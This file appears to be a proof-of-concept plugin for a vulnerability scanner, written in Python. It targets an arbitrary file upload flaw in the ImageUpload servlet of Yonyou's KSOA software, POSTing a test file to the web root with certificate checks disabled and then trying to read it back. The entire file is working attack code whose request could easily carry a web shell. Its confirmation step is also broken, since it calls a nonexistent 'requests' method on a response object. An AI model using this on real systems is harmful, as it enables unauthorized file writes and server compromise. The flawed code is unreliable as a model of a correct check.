#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/E96atZiXsBraRWsOmVUHxg',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '用友时空KSOA ImageUpload 任意文件上传',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret

def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,

      }
  target = '/servlet/com.sksoft.bill.ImageUpload?filename=zhangsan.txt&filepath=/'
  data = '1234567890'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.post(url=url1,headers=headers,data=data,timeout=5,verify=False)
    if res.status_code == 200 and "zhangsan.txt" in res.text:
      res.requests(url=url+'/zhangsan.txt',headers=headers,timeout=5,verify=False)
      if '1234567890' in res.text and res.status_code == 200:
        ret['huixian'] = res.text
        ret['ifbug'] = True
        res.close()
        return ret
      else:
        return ret
    else:
      return ret
  except:
    return ret